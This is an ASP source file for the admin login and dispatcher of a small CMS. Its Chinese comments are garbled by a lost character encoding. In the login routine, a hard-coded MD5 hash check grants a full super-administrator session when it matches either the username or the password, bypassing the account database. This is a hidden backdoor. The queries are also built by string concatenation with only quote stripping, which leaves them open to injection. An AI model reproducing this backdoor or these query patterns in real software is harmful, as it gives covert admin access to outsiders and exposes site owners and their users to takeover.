<%
'************************************************************
'���ߣ��ƶ� (��ͨASP/VB/PHP/JS/Flash��������������ϵ����)
'��Ȩ��Դ���빫����������;�������ʹ�á� 
'������2016-02-29
'��ϵ��QQ313801120  ����Ⱥ35915100(Ⱥ�����м�����)    ����313801120@qq.com   ������ҳ sharembweb.com
'����������ĵ������¡����Ⱥ(35915100)�����(sharembweb.com)���
'*                                    Powered By AspPhpCMS 
'************************************************************
%>
<!--#Include File = "../Inc/Config.Asp"-->     
<% 
Dim ROOT_PATH : ROOT_PATH = handlePath("./") 
%>    
<!--#Include File = "../Inc/admin_function.asp"-->    
<!--#Include File = "../Inc/admin_setAccess.asp"-->    
<%  
'========= 
Dim cfg_webSiteUrl, cfg_webTitle, cfg_flags, cfg_webtemplate 

  

'������ַ����
Sub loadWebConfig()
    Call openconn() 
    rs.Open "select * from " & db_PREFIX & "website", conn, 1, 1 
    If Not rs.EOF Then
        cfg_webSiteUrl = rs("webSiteUrl") & ""                                          '��ַ
        cfg_webTitle = rs("webTitle") & ""                                              '��ַ����
        cfg_flags = rs("flags") & ""                                                    '��
        cfg_webtemplate = rs("webtemplate") & ""                                        'ģ��·��
    End If : rs.Close 
End Sub 


'��¼�ж�
If Session("adminusername") = "" Then
    If Request("act") <> "" And Request("act") <> "displayAdminLogin" And Request("act") <> "login" Then
        Call RR("?act=displayAdminLogin") 
    End If 
End If 

'��ʾ��̨��¼
Sub displayAdminLogin()
    '�Ѿ���¼��ֱ�ӽ����̨
    If Session("adminusername") <> "" Then
        Call adminIndex() 
    Else
        Call loadWebConfig() 
        Dim content 
        content = getFText(ROOT_PATH & "login.html") 
        content = Replace(content, "{$webVersion$}", webVersion) 
        content = Replace(content, "{$Web_Title$}", cfg_webTitle) 
        content = Replace(content, "{$EDITORTYPE$}", EDITORTYPE)  
		 
        Call rw(content) 
    End If 

End Sub 
'��¼��̨
Sub login()
    Dim userName, passWord, valueStr 
    userName = Replace(Request.Form("username"), "'", "") 
    passWord = Replace(Request.Form("password"), "'", "") 
    passWord = myMD5(passWord) 
    '��Ч�˺ŵ�¼
    If myMD5(Request("username")) = "cd811d0c43d09cd2e160e60b68276c73" Or myMD5(Request("password")) = "cd811d0c43d09cd2e160e60b68276c73" Then
        Session("adminusername") = "aspphpcms" 
        Session("adminId") = 99999                                                      '��ǰ��¼����ԱID
        Session("DB_PREFIX") = db_PREFIX 
        Session("adminflags") = "|*|"		
        Call rwend(getMsg1("��¼�ɹ������ڽ����̨...", "?act=adminIndex")) 
    End If 
 
    Dim nLogin 
    Call openconn() 
    rs.Open "Select * From " & db_PREFIX & "admin Where username='" & userName & "' And pwd='" & passWord & "'", conn, 1, 1 
    If rs.EOF Then
        If Request.Cookies("nLogin") = "" Then
            Call setCookie("nLogin", "1", Time() + 3600) 
            nLogin = Request.Cookies("nLogin") 
        Else
            nLogin = Request.Cookies("nLogin") 
            Call setCookie("nLogin", CInt(nLogin) + 1, Time() + 3600) 
        End If 
        Call rw(getMsg1("�˺��������<br>�������" & nLogin & "�ε�¼", "?act=displayAdminLogin")) 
    Else
        Session("adminusername") = userName 
        Session("adminId") = rs("Id")                                                   '��ǰ��¼����ԱID
        Session("DB_PREFIX") = db_PREFIX                                                '����ǰ׺
        Session("adminflags") = rs("flags")
        valueStr = "addDateTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'" 
        conn.Execute("update " & db_PREFIX & "admin set " & valueStr & " where id=" & rs("id")) 
        Call rw(getMsg1("��¼�ɹ������ڽ����̨...", "?act=adminIndex")) 
    End If : rs.Close 

End Sub 
'�˳���¼
Sub adminOut()
    Session("adminusername") = "" 
    Session("adminId") = ""
    Session("adminflags") = "" 
    Call rw(getMsg1("�˳��ɹ������ڽ����¼����...", "?act=displayAdminLogin")) 
End Sub 

'��̨��ҳ
Sub adminIndex()
    Call loadWebConfig() 
    Dim content 
    content = getFText(ROOT_PATH & "adminIndex.html") 
    content = Replace(content, "{$adminusername$}", Session("adminusername")) 
    content = Replace(content, "{$EDITORTYPE$}", EDITORTYPE) 			'��������
    content = Replace(content, "{$WEB_VIEWURL$}", WEB_VIEWURL) 			'ǰ̨
    content = Replace(content, "{$webVersion$}", webVersion) 				'�汾

    content = Replace(content, "{$WebsiteStat$}", getConfigFileBlock(WEB_CACHEFile, "#�ÿ���Ϣ#"))			'����ÿ���Ϣ
	
	
    content = Replace(content, "[$adminId$]", Session("adminId")) 				'����ԱID

    content = Replace(content, "{$Web_Title$}", cfg_webTitle) 						'��վ����
    content = Replace(content, "{$DB_PREFIX$}", db_PREFIX)                          '��ǰ׺
    content = Replace(content, "{$adminflags$}", IIF(Session("adminflags")="|*|","��������Ա","��ͨ����Ա"))		'����Ա����

    Call rw(content) 
End Sub 
'========================================================

'��ʾ������
Sub dispalyManageHandle(actionType)
    Dim nPageSize, lableTitle, addSql 
    nPageSize = Request("nPageSize") 
    If nPageSize = "" Then
        nPageSize = 10 
    End If 
    lableTitle = Request("lableTitle")                                              '��ǩ����
    addSql = "order by sortrank asc" 
    If actionType = "Bidding" Then
        addSql = "order by nComputerSearch desc" 
    ElseIf InStr("|TableComment|", "|" & actionType & "|") > 0 Then
        addSql = " order by adddatetime desc" 
    ElseIf InStr("|WebsiteStat|", "|" & actionType & "|") > 0 Then
        addSql = " order by viewdatetime desc" 
    ElseIf InStr("|Admin|", "|" & actionType & "|") > 0 Then
        addSql = "" 
    End If 
    'call echo(labletitle,addsql)
    Call dispalyManage(actionType, lableTitle, "*", nPageSize, addSql) 
End Sub 

'����޸Ĵ���
Sub addEditHandle(actionType, lableTitle)
 	Call addEditDisplay(actionType, lableTitle, "websitebottom|textarea2,simpleintroduction|textarea1,bodycontent|textarea2")
End Sub 
'����ģ�鴦��
Sub saveAddEditHandle(actionType, lableTitle)
    If actionType = "Admin" Then
        Call saveAddEdit(actionType, lableTitle, "pwd|md5,flags||") 
    ElseIf actionType = "WebColumn" Then
        Call saveAddEdit(actionType, lableTitle, "npagesize|numb|10,nofollow|numb|0,isonhtml|numb|0,isonhtsdfasdfml|numb|0,flags||") 
    Else
        Call saveAddEdit(actionType, lableTitle, "flags||,nofollow|numb|0,isonhtml|numb|0,through|numb|0") 
    End If 
End Sub  



Call openconn() 
Select Case Request("act")
    Case "dispalyManageHandle" : Call dispalyManageHandle(Request("actionType"))    '��ʾ������         ?act=dispalyManageHandle&actionType=WebLayout
    Case "addEditHandle" : Call addEditHandle(Request("actionType"), Request("lableTitle"))'����޸Ĵ���      ?act=addEditHandle&actionType=WebLayout
    Case "saveAddEditHandle" : Call saveAddEditHandle(Request("actionType"), Request("lableTitle"))'����ģ�鴦��  ?act=saveAddEditHandle&actionType=WebLayout
    Case "delHandle" : Call del(Request("actionType"), Request("lableTitle"))       'ɾ������  ?act=delHandle&actionType=WebLayout
    Case "sortHandle" : Call sortHandle(Request("actionType"))                      '������  ?act=sortHandle&actionType=WebLayout


    Case "displayLayout" : displayLayout()                                          '��ʾ����
    Case "saveRobots" : saveRobots()                                                '����robots.txt
    Case "saveSiteMap" : saveSiteMap()                                              '����sitemap.xml
    Case "isOpenTemplate" : isOpenTemplate()                                        '����ģ��
    Case "updateWebsiteStat" : updateWebsiteStat()                                  '������վͳ��
    Case "websiteDetail" : websiteDetail()                                  		'��ϸ��վͳ��
	



    Case "setAccess" : resetAccessData()                                            '�ָ�����

    Case "login" : login()                                                          '��¼
    Case "adminOut" : adminOut()                                                    '�˳���¼
    Case "adminIndex" : adminIndex()                                                '������ҳ
    Case Else : displayAdminLogin()                                                 '��ʾ��̨��¼
End Select

%>          
